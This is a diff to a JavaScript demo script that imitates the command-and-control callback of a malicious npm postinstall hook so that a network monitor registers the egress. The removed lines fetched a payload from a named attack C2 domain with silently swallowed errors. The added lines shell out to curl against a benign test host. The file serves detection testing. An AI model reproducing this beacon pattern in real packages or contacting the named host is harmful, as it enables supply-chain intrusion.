@@ -1,12 +1,11 @@
-// Demo: simulates the C2 callback that the real plain-crypto-js postinstall made.
-// Target: sfrclak.com:8000 — the actual C2 domain used in the Axios March 2026 attack.
-// This version calls httpbin.org (always up, benign) so it shows as network egress.
-// Harden-Runner flags any unexpected outbound connection; this triggers that detection.
-var http = require('http');
+// Demo: simulates the C2 callback from the Axios March 2026 attack.
+// Real attack called sfrclak.com:8000 (domain now dead/unresolvable).
+// Uses execSync+curl so the TCP connection completes before the process exits,
+// making it visible in Harden-Runner's network event log.
+var execSync = require('child_process').execSync;
 try {
-  http.get('http://sfrclak.com:8000/npm/plain-crypto-js/-/4.2.0.tgz', function(res) {
-    res.destroy();
-  }).on('error', function() {
-    // Silent — the RAT self-deletes and fails silently to avoid detection
-  });
+  execSync(
+    'curl -s --max-time 3 "http://httpbin.org/get?c2=plain-crypto-js&v=4.2.0" -o /dev/null',
+    { timeout: 5000 }
+  );
 } catch(e) {}
